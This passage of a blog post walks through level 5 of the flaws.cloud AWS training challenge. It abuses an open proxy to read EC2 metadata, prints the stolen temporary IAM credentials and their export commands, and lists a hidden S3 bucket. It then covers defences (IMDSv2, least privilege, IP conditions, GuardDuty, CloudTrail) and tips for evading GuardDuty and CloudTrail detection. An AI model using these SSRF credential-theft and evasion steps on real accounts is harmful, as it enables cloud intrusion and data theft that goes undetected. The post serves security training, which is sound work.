+  <span style="color: #f92672">&quot;kernelId&quot;</span> <span style="color: #f8f8f2">:</span> <span style="color: #66d9ef">null</span><span style="color: #f8f8f2">,</span>
+  <span style="color: #f92672">&quot;ramdiskId&quot;</span> <span style="color: #f8f8f2">:</span> <span style="color: #66d9ef">null</span><span style="color: #f8f8f2">,</span>
+  <span style="color: #f92672">&quot;accountId&quot;</span> <span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&quot;975426262029&quot;</span><span style="color: #f8f8f2">,</span>
+  <span style="color: #f92672">&quot;architecture&quot;</span> <span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&quot;x86_64&quot;</span><span style="color: #f8f8f2">,</span>
+  <span style="color: #f92672">&quot;imageId&quot;</span> <span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&quot;ami-7c803d1c&quot;</span><span style="color: #f8f8f2">,</span>
+  <span style="color: #f92672">&quot;pendingTime&quot;</span> <span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&quot;2017-02-12T22:29:24Z&quot;</span><span style="color: #f8f8f2">,</span>
+  <span style="color: #f92672">&quot;region&quot;</span> <span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&quot;us-west-2&quot;</span>
+<span style="color: #f8f8f2">}</span>
+</code></pre></div>
+
+<p>Another place for valuable information is the <a href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/user-data.html#user-data-api-cli">user data</a>.
+AWS lets you specify a script that runs when an instance boots up.
+You could see the script at <a href="http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/user-data/">169.254.169.254/latest/user-data</a>,
+but for this instance there is none. In other cases you may find hard-coded
+credentials in this script file.</p>
+
+<p>Most importantly though you should check for <a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_use_switch-role-ec2_instance-profiles.html">IAM instance profile</a>
+credentials. Instead of hard-coding passwords into EC2 instances AWS allows you
+to assign an instance profile to a machine. This machine can then request
+temporary credentials with corresponding permissions from the metadata service.
+Credentials are only valid for a short time (a few hours at most) and never
+touch any disk.</p>
+
+<p>This means that we should be able to ask to proxy to get these credentials for
+us. The manual request is a two-step procedure.
+First, find the instance profile name at <a href="http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/info/">169.254.169.254/latest/meta-data/iam/info/</a>,
+which will look like this:</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-json" data-lang="json"><span></span><span style="color: #f8f8f2">{</span>
+  <span style="color: #f92672">&quot;Code&quot;</span> <span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&quot;Success&quot;</span><span style="color: #f8f8f2">,</span>
+  <span style="color: #f92672">&quot;LastUpdated&quot;</span> <span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&quot;2019-11-12T15:26:22Z&quot;</span><span style="color: #f8f8f2">,</span>
+  <span style="color: #f92672">&quot;InstanceProfileArn&quot;</span> <span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&quot;arn:aws:iam::975426262029:instance-profile/flaws&quot;</span><span style="color: #f8f8f2">,</span>
+  <span style="color: #f92672">&quot;InstanceProfileId&quot;</span> <span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&quot;AIPAIK7LV6U6UXJXQQR3Q&quot;</span>
+<span style="color: #f8f8f2">}</span>
+</code></pre></div>
+
+<p>Now we know it is called &ldquo;flaws&rdquo;.
+Fetch temporary credentials for the role from <a href="http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws/">169.254.169.254/latest/meta-data/iam/security-credentials/flaws</a>
+and you should see something like this:</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-json" data-lang="json"><span></span><span style="color: #f8f8f2">{</span>
+  <span style="color: #f92672">&quot;Code&quot;</span> <span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&quot;Success&quot;</span><span style="color: #f8f8f2">,</span>
+  <span style="color: #f92672">&quot;LastUpdated&quot;</span> <span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&quot;2019-11-12T15:26:38Z&quot;</span><span style="color: #f8f8f2">,</span>
+  <span style="color: #f92672">&quot;Type&quot;</span> <span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&quot;AWS-HMAC&quot;</span><span style="color: #f8f8f2">,</span>
+  <span style="color: #f92672">&quot;AccessKeyId&quot;</span> <span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&quot;ASIA6GG7PSQG2DUIX6WK&quot;</span><span style="color: #f8f8f2">,</span>
+  <span style="color: #f92672">&quot;SecretAccessKey&quot;</span> <span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&quot;nqHFBc6JioWLn97VcuR2M3JYDHoaMfsuc1oKyasH&quot;</span><span style="color: #f8f8f2">,</span>
+  <span style="color: #f92672">&quot;Token&quot;</span> <span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&quot;IQoJb3JpZ2luX2VjEPD//////////wEaCXVzLXdlc3QtMiJGMEQCIG1yD/Vn/GDjnsCiO/Z0fpBMb0683hKDRtchraQcILQEAiAejtgTNX34u9vtT3fOqgyrNK2bvVMJWC0BMg1RxT4Y8SrSAggZEAAaDDk3NTQyNjI2MjAyOSIMlCGMWOpWm2U+5ItZKq8Ct4hi0KsQvsXCfRZs6M5uSUcBsh6voTztyBRx/gz03VmntxcTVHQZ0A9OwVYqzwo5OPzrauGqWAvzoT4NfcYVhNL1aWezbfXASLlLntO2m3RUFzoJUxMTHA3MM0myFuSVpW4DQBh+uDHCBwaxODYp4lAIbLBWE5+AVFLo0VdCVMUI7Syp181BmJiOWG62VuP6Mo5GHYvnWej7X2i7xt8FK7glanlayMpxto0a5KQsQI0NlLXKthvplOE9vMXKluVhBDj6PEvWYfE2rrVqmordfmqWkJbzs/Xu3XO0QbH/O2wbisOp3Rh+hQ72vAGGyQNUyy/j4iDXvkSJf6XE0+MiCiDLIkzZO3QbhHogTLQruChDF4hFagZJpa3vzfuKe+a4867KwjPYy6TqSsQS6vz/MJ6eq+4FOs4CZqC9yNSdhvUV4feei8iDC4PLQc9kanGY/74wYTo6jhynACeOZaxTbK3lHPwOtR4EDTdHmvtZ85ayXJ0zmjVndR0lB/Mt7LAQx8yXNpT23u6bK4XdN928nxF6QvrOHzuteHrSGKLcZOsQZZ/G5kovD6o3eeJ++1lymBNPtzN3/FaeVMgPly7gMbbCRqW/Q65Zw7tTYbKVLQJAfAh19ukfnuCNDMJexaSaMWM5l+djbD+TNw9A3cm+GAb6j6yYAv21+EnBAuUxOISI5CCI+9wRfKGHu/vgSLVt1uwvkHnFBFMcvVfcTYg8kQIEGZTQnxOw/sDr/32PugpmXjBc3OdLajgucrKkUdhaHP/XIA8nEYy8yTQHZguw9tsXaox4wz/dQKMzJsT+6mGdmMGyOnKMZmlW9ZqqXgHC57fi01IhjcamrxZr9E216qNTvsYS2g==&quot;</span><span style="color: #f8f8f2">,</span>
+  <span style="color: #f92672">&quot;Expiration&quot;</span> <span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&quot;2019-11-12T21:42:31Z&quot;</span>
+<span style="color: #f8f8f2">}</span>
+</code></pre></div>
+
+<p>Nice, we have a key and a session token.</p>
+
+<h2 id="using-the-credentials">Using the credentials</h2>
+
+<p>So we have credentials now. Lets try to list the bucket.
+To use the credentials, you could source them into your environment:</p>
+
+<pre><code> # export AWS_ACCESS_KEY_ID=ASIA6GG7PSQG2DUIX6WK
+ # export AWS_SECRET_ACCESS_KEY=nqHFBc6JioWLn97VcuR2M3JYDHoaMfsuc1oKyasH
+ # export AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEPD//////////wEaCXVzLXdlc3QtMiJGMEQCIG1yD/Vn/GDjnsCiO/Z0fpBMb0683hKDRtchraQcILQEAiAejtgTNX34u9vtT3fOqgyrNK2bvVMJWC0BMg1RxT4Y8SrSAggZEAAaDDk3NTQyNjI2MjAyOSIMlCGMWOpWm2U+5ItZKq8Ct4hi0KsQvsXCfRZs6M5uSUcBsh6voTztyBRx/gz03VmntxcTVHQZ0A9OwVYqzwo5OPzrauGqWAvzoT4NfcYVhNL1aWezbfXASLlLntO2m3RUFzoJUxMTHA3MM0myFuSVpW4DQBh+uDHCBwaxODYp4lAIbLBWE5+AVFLo0VdCVMUI7Syp181BmJiOWG62VuP6Mo5GHYvnWej7X2i7xt8FK7glanlayMpxto0a5KQsQI0NlLXKthvplOE9vMXKluVhBDj6PEvWYfE2rrVqmordfmqWkJbzs/Xu3XO0QbH/O2wbisOp3Rh+hQ72vAGGyQNUyy/j4iDXvkSJf6XE0+MiCiDLIkzZO3QbhHogTLQruChDF4hFagZJpa3vzfuKe+a4867KwjPYy6TqSsQS6vz/MJ6eq+4FOs4CZqC9yNSdhvUV4feei8iDC4PLQc9kanGY/74wYTo6jhynACeOZaxTbK3lHPwOtR4EDTdHmvtZ85ayXJ0zmjVndR0lB/Mt7LAQx8yXNpT23u6bK4XdN928nxF6QvrOHzuteHrSGKLcZOsQZZ/G5kovD6o3eeJ++1lymBNPtzN3/FaeVMgPly7gMbbCRqW/Q65Zw7tTYbKVLQJAfAh19ukfnuCNDMJexaSaMWM5l+djbD+TNw9A3cm+GAb6j6yYAv21+EnBAuUxOISI5CCI+9wRfKGHu/vgSLVt1uwvkHnFBFMcvVfcTYg8kQIEGZTQnxOw/sDr/32PugpmXjBc3OdLajgucrKkUdhaHP/XIA8nEYy8yTQHZguw9tsXaox4wz/dQKMzJsT+6mGdmMGyOnKMZmlW9ZqqXgHC57fi01IhjcamrxZr9E216qNTvsYS2g==
+</code></pre>
+
+<p>Confirm that it worked by checking your caller identity.
+It should be a role with the same name as the instance profile, with the
+instance ID as session name:</p>
+
+<pre><code> # aws sts get-caller-identity
+{
+    &quot;UserId&quot;: &quot;AROAI3DXO3QJ4JAWIIQ5S:i-05bef8a081f307783&quot;,
+    &quot;Account&quot;: &quot;975426262029&quot;,
+    &quot;Arn&quot;: &quot;arn:aws:sts::975426262029:assumed-role/flaws/i-05bef8a081f307783&quot;
+}
+</code></pre>
+
+<p>Now the final part is easy. List the bucket:</p>
+
+<pre><code> # aws s3api list-objects-v2 --bucket level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud --region us-west-2
+{
+    &quot;Contents&quot;: [
+        ...
+        {
+            &quot;Key&quot;: &quot;ddcc78ff/index.html&quot;,
+            &quot;LastModified&quot;: &quot;2017-03-03T04:36:25.000Z&quot;,
+            &quot;ETag&quot;: &quot;\&quot;e144e5208ec070129e9e0bd9369967b0\&quot;&quot;,
+            &quot;Size&quot;: 2782,
+            &quot;StorageClass&quot;: &quot;STANDARD&quot;
+        },
+        {
+            &quot;Key&quot;: &quot;index.html&quot;,
+            &quot;LastModified&quot;: &quot;2017-02-27T02:11:07.000Z&quot;,
+            &quot;ETag&quot;: &quot;\&quot;6b0ffa72702b171487f97e8f443599ee\&quot;&quot;,
+            &quot;Size&quot;: 871,
+            &quot;StorageClass&quot;: &quot;STANDARD&quot;
+        }
+    ]
+}
+</code></pre>
+
+<p>Up there you can see that we found the secret subdirectory &ldquo;ddcc78ff&rdquo;.
+We can now go to the <a href="http://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/">hidden page</a>
+and find ourselves in level 6.</p>
+
+<h1 id="the-flaw">The flaw</h1>
+
+<p>The main problem in this level is clearly the proxy not blocking requests to
+the metadata service. By default, a proxy intended for websites should probably be set up
+such that it blocks at least link-local (<a href="https://tools.ietf.org/html/rfc3927">RFC 3927</a>)
+as well as private (<a href="https://tools.ietf.org/html/rfc1918">RFC 1918</a>)
+IP addresses, maybe with carefully added exceptions depending on the use case.</p>
+
+<p>Still, you might argue that this is a rather special use case. Not many people
+set up proxies like this one. From the application development point of view though any
+server-side request forgery (<a href="https://www.owasp.org/index.php/Server_Side_Request_Forgery">SSRF</a>)
+vulnerability may be exploitable in the same way.
+So, besides the fact that you should carefully check the config of your WAFs
+and other proxies, another learning is to realize how bad SSRF can be if you host your stuff
+on EC2. The <a href="https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF">HackerOne tutorial on SSRF</a>
+specifically mentions EC2 metadata as a reason why SSRF can have big impact.</p>
+
+<h2 id="prevent-misconfigurations-and-ssrf">Prevent misconfigurations and SSRF</h2>
+
+<p>Obviously not making a mistake will always fix it but puts considerable
+responsibilities on admins and developers. Only one mistake is needed to
+create a problem. Still, fewer problems means it is harder to find one, so give
+your best. Give your best, write secure code and test applications as well as
+all networking tools for this. Critical components are everything that performs
+outbound requests on the users behalf and is somehow configurable. For
+example there could be a webhooks feature with SSRF.</p>
+
+<p>Besides crossing your fingers you could also firewall outgoing connections.
+This can help but only if the legitimate applications running on the machine do
+not need the connection. For example, in this level the instance may need
+access to the instance profile credentials (why else would it have an instance
+profile) so you can&rsquo;t just block access to it. In other cases it may help though.</p>
+
+<h2 id="imdsv2">IMDSv2</h2>
+
+<p>There is a brand-new instance metadata service which is way more secure than
+the traditional one, <a href="https://aws.amazon.com/blogs/security/defense-in-depth-open-firewalls-reverse-proxies-ssrf-vulnerabilities-ec2-instance-metadata-service/">announced</a>
+only a few days ago. Official documentation is <a href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html">here</a>.
+By default both versions run in parallel but it is possible to disable the old
+version explicitly.</p>
+
+<p>With this new version you have to set up a session with the metadata service
+before you can retrieve anything. You do so by requesting &ldquo;<a href="http://169.254.169.254/latest/api/token&quot;">http://169.254.169.254/latest/api/token&quot;</a>
+using the PUT method. It returns a token that needs to be in the &ldquo;X-aws-ec2-metadata-token&rdquo;
+header for all subsequent GET requests against the metadata service.</p>
+
+<p>In our case it would have stopped the attack had version 1 been disabled.
+The proxy will only do GET requests for us so there is no way to send a PUT for
+the login. (Presumably) there is also no way to brute-force the token it would
+have returned. As a result we would not be able to extract credentials.</p>
+
+<p>For example, my (silly) try to make the proxy do a PUT can be seen below.
+Issuing a PUT against Google returns a complaint about an invalid method:</p>
+
+<pre><code> # curl -i -X PUT -d 'param=value' http://google.com
+HTTP/1.1 405 Method Not Allowed
+Allow: GET, HEAD
+...
+</code></pre>
+
+<p>Trying to send this through the proxy returns just a 403:</p>
+
+<pre><code> # curl -i -X PUT -d 'param=value' http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/http://google.com
+HTTP/1.1 403 Forbidden
+...
+</code></pre>
+
+<h2 id="least-privilege">Least privilege</h2>
+
+<p>When you are done with the above then assume that all of it does not help and
+your credentials will get disclosed. It often requires some effort to design
+permissions tailored to the application using it. Still, it is the only way to
+limit the blast radius of a disclosure.</p>
+
+<p>The CapitalOne hack is a great example for this.
+In an effort to present evidence for a hack, the indictment mentions the fact that the WAF security
+account listed S3 buckets even though - under normal circumstances - it never does (<a href="https://www.justice.gov/usao-wdwa/press-release/file/1188626/download">page 7</a>).
+This not only indicates unauthorized access, it is also a good example for
+credentials that have more permissions than they need. If the WAF never does
+it it should not be allowed to do it. In this case it was, maybe because it was
+just easier to give access to all of S3 than to specifically check what exactly
+is needed.</p>
+
+<h2 id="iam-ip-constrains">IAM IP constrains</h2>
+
+<p>Further assuming an attacker got credentials and the permissions (whatever they
+are) do allow doing harm. What else can we do to protect us?
+One thing would be to add IP restrictions to your IAM policies.
+My personal experience is that AWS is not really designed for this and it can
+be clumsy to set up but it does stop many attacks.</p>
+
+<p>A lesser known feature of IAM is that it allows you to specify conditions.
+A policy will only take effect if the conditions are met (<a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_policies_condition-keys.html">AWS docs on condition keys</a>).
+One such condition is that the public IP address of the entity making the API
+request has to be in a certain IP range. Consider the IAM policy below as an
+example. This would deny all actions performed by the IAM user &ldquo;some-user&rdquo;
+unless they originate from IP &ldquo;1.2.3.4&rdquo;:</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-json" data-lang="json"><span></span><span style="color: #f8f8f2">{</span>
+  <span style="color: #f92672">&quot;Version&quot;</span><span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&quot;2012-10-17&quot;</span><span style="color: #f8f8f2">,</span>
+  <span style="color: #f92672">&quot;Statement&quot;</span><span style="color: #f8f8f2">:</span> <span style="color: #f8f8f2">[</span>
+    <span style="color: #f8f8f2">{</span>
+      <span style="color: #f92672">&quot;Effect&quot;</span><span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&quot;Deny&quot;</span><span style="color: #f8f8f2">,</span>
+      <span style="color: #f92672">&quot;Principal&quot;</span><span style="color: #f8f8f2">:</span> <span style="color: #f8f8f2">{</span> <span style="color: #f92672">&quot;AWS&quot;</span><span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&quot;arn:aws:iam::account-id:user/some-user&quot;</span> <span style="color: #f8f8f2">},</span>
+      <span style="color: #f92672">&quot;Action&quot;</span><span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&quot;*&quot;</span><span style="color: #f8f8f2">,</span>
+      <span style="color: #f92672">&quot;Condition&quot;</span><span style="color: #f8f8f2">:</span> <span style="color: #f8f8f2">{</span>
+        <span style="color: #f92672">&quot;NotIpAddress&quot;</span><span style="color: #f8f8f2">:</span> <span style="color: #f8f8f2">{</span>
+          <span style="color: #f92672">&quot;aws:SourceIp&quot;</span><span style="color: #f8f8f2">:</span> <span style="color: #f8f8f2">[</span> <span style="color: #e6db74">&quot;1.2.3.4/32&quot;</span> <span style="color: #f8f8f2">]</span>
+        <span style="color: #f8f8f2">}</span>
+      <span style="color: #f8f8f2">}</span>
+    <span style="color: #f8f8f2">}</span>
+  <span style="color: #f8f8f2">]</span>
+<span style="color: #f8f8f2">}</span>
+</code></pre></div>
+
+<p>More details can be found in the <a href="https://aws.amazon.com/premiumsupport/knowledge-center/iam-restrict-calls-ip-addresses/">knowledge base</a>.
+Prepare for hard-to-debug problems if you do on large scale. AWS services
+sometimes use other services on your behalf. The source IP of these requests
+will not be yours but that of the machine this AWS service is operated on. Thus
+things may fail, apparently for no reason. For example, <a href="https://aws.amazon.com/athena/">AWS Athena</a>,
+a serverless version of <a href="https://prestodb.io/">Presto</a>, will access S3 on your
+behalf to execute queries on your S3 data. Requests to the Athena API will
+originate from your IP. But follow-up requests to the S3 API, while using your
+credentials, will originate from the Presto cluster operated by AWS.</p>
+
+<p>For the example in this level you could add a condition to allow using the
+credentials only from the public IP address of the EC2 instance (you may want
+to add an <a href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/elastic-ip-addresses-eip.html">Elastic IP</a>
+to ensure it does not change on a reboot).
+Such a restriction would make it much harder for us to use the credentials from
+elsewhere, particularly if we do not know about the restriction.
+Note that if we do, we may attempt to use the proxy for AWS API access via the EC2 machine.
+It probably works but looks like quite some work to me
+(if you successfully did it let me know!). At least with SSRF it may often be
+impossible to do.</p>
+
+<h2 id="detection-and-alerting">Detection and alerting</h2>
+
+<p>Finally, if we can&rsquo;t prevent it, we should at least know about unauthorized use
+of credentials. Early detection allows us to deactivate access credentials
+before serious harm is done.
+We need alerts and AWS has much to offer in regards to that.
+Imho the most important services are GuardDuty and CloudTrail.</p>
+
+<h3 id="guardduty">GuardDuty</h3>
+
+<p>First and foremost, there is an AWS service called <a href="https://aws.amazon.com/guardduty/">GuardDuty</a>
+which watches your account for suspicious behavior.
+Among other things one of the features is to detect EC2 instance credential use
+from any host does not have a known EC2 address.
+Thus, while it would not stop the attack, you would at least receive a
+warning about suspicious behaviour (e.g., via email).
+You would receive an <a href="https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_unauthorized.html#unauthorized11">UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration</a>
+finding and get the IP of the attacker.</p>
+
+<p>However, as an attacker it is quite easy to avoid detection by this GuardDuty rule.
+You can use stolen credentials literally from any EC2 machine on this earth.
+Just don&rsquo;t use your laptop. Fire up an attack machine. That is all it takes.
+An detailed example for this evasion technique can be found on
+<a href="https://frichetten.com/blog/hijack-iam-roles-and-avoid-detection">Nick Frichette&rsquo;s blog</a>.</p>
+
+<p>As a side note: don&rsquo;t use Kali, Parrot or Pentoo either for your requests.
+Not even if you run them on EC2. If you do, remember to patch your tools like
+the AWS CLI and SDKs. The reason is that they expose operating system
+details to AWS in each request in the user agent.
+GuardDuty has <a href="https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_pentest.html#pentest1">rules</a>
+to alert when typical hacker operating systems are used.
+It is <a href="https://www.thesubtlety.com/post/patching-boto3-useragent/">easy to change the user agent</a>
+to something normal.</p>
+
+<h3 id="cloudtrail">CloudTrail</h3>
+
+<p>Second, there is a service called <a href="https://aws.amazon.com/cloudtrail/">CloudTrail</a>
+which is capable of logging all requests made to the AWS API that somehow
+relate to your account (actually much of GuardDuty is built on this service).
+Clever defenders could use it to inspect how
+credentials are typically used and build alerts for unusual behaviour.
+For example, above we verified our identity by calling
+<a href="https://docs.aws.amazon.com/cli/latest/reference/sts/get-caller-identity.html">get-caller-identity</a>,
+an endpoint of the Security Token Service API. If the EC2 instance normally does not
+do this it would be a good indicator for compromise so see such a call.
+Filer for &ldquo;eventName&rdquo; = &ldquo;GetCallerIdentity&rdquo; in CloudTrail to see it.</p>
+
+<p>As an attacker, the only way to avoid detection then is to either use (guess)
+only legitimate calls, or to call APIs that do not support CloudTrail yet
+(A nice trick described on <a href="https://rhinosecuritylabs.com/aws/aws-iam-enumeration-2-0-bypassing-cloudtrail-logging/">rhinosecuritylabs.com</a>).
+Amazon maintains a list of brand-new services without CloudTrail support
+<a href="https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-unsupported-aws-services.html">here</a>.
+For example, at the time of writing
+<a href="https://aws.amazon.com/connect/">Amazon Connect</a> is not supported.
+To see our IAM identity without &ldquo;get-caller-identity&rdquo; we could issue a request
+against this API and - assuming it is unauthorized - the error message contains
+our identity:</p>
+
+<pre><code> # aws connect describe-user --user-id abc --instance-id 123
+
+An error occurred (AccessDeniedException) when calling the DescribeUser operation: User: arn:aws:sts::975426262029:assumed-role/flaws/i-05bef8a081f307783 is not authorized ...
+</code></pre>
+
+<p>No entry in CloudTrail would appear that could be alerted on. Knowing the name
+of a role, you my be able to guess what it is good for and do follow-up calls.</p>
+
+<h1 id="conclusion">Conclusion</h1>
+
+<p>We saw how exploitation of proxy or web application vulnerabilities can lead to disclosure
+of AWS credentials and how attackers can then leverage these credentials to
+exfiltrate data. The example of CapitalOne shows that issues like that are a
+real problem. The workflow is pretty straightforward and, unless
+sophisticated logging is in place, attackers can pretty much just poke at the
+AWS API until they find something they have access to. The fact that public
+clouds have public APIs plays into the attackers hands here.</p>
+
+<p>Multiple things can be done to mitigate the risk:</p>
+
+<ul>
+<li>Write secure application code and proper configuration so that credentials
+don&rsquo;t leak (i.e., do a lot of testing)</li>
+<li>Harden the EC2 instance metadata service to make it hard to exploit a flaw
+(i.e., disable IMDSv1)</li>
+<li>Follow the principle of least privilege and add IP or VPC constraints when
+you design IAM policies</li>
+<li>Use AWS loggings and alerting services like GuardDuty and CloudTrail to
+detect misuse early so that you have time to react ()</li>
+</ul>
+
+    </div>
+    
+    <footer>
+      <hr>
+      <p>
+  Published
+  
+    
+      by <span itemprop="author">Dominic Breuker</span>
+    
+  
+  <time itemprop="datePublished" datetime="2019-11-28T00:00:00&#43;01:00">
+    28 Nov, 2019
+  </time>
+  
+    in <span itemprop="articleSection"><a href="/categories/aws/">AWS</a></span>
+  
+  
+    and tagged <a href="/tags/aws/">AWS</a>, <a href="/tags/cloud/">cloud</a> and <a href="/tags/infosec/">infosec</a>
+  
+  using <span itemprop="wordCount">2810</span> words.
+</p>
+
+      
+
+
+  <aside>
+    <header>Related Content</header>
+    <ul>
+      
+        <li><a href="/post/flaws_cloud_4/">flaws.cloud - Level 4</a>
+        <time datetime="15M">15 minutes</time>
+      
+        <li><a href="/post/flaws_cloud_3/">flaws.cloud - Level 3</a>
+        <time datetime="9M">9 minutes</time>
+      
+        <li><a href="/post/flaws_cloud_2/">flaws.cloud - Level 2</a>
+        <time datetime="8M">8 minutes</time>
+      
+        <li><a href="/post/flaws_cloud_lvl1/">flaws.cloud - Level 1</a>
+        <time datetime="6M">6 minutes</time>
+      
+        <li><a href="/post/htb_carrier/">Hack The Box Write-up - Carrier</a>
+        <time datetime="25M">25 minutes</time>
+      
+        <li><a href="/post/htb_access/">Hack The Box Write-up - Access</a>
+        <time datetime="11M">11 minutes</time>
+      
+        <li><a href="/post/htb_active/">Hack The Box Write-up - Active</a>
+        <time datetime="12M">12 minutes</time>
+      
+    </ul>
+  </aside>
+
+
+    </footer>
+  </article>
+</main>
+    <footer>
+  
+
+</footer>
+  </body>
+</html>
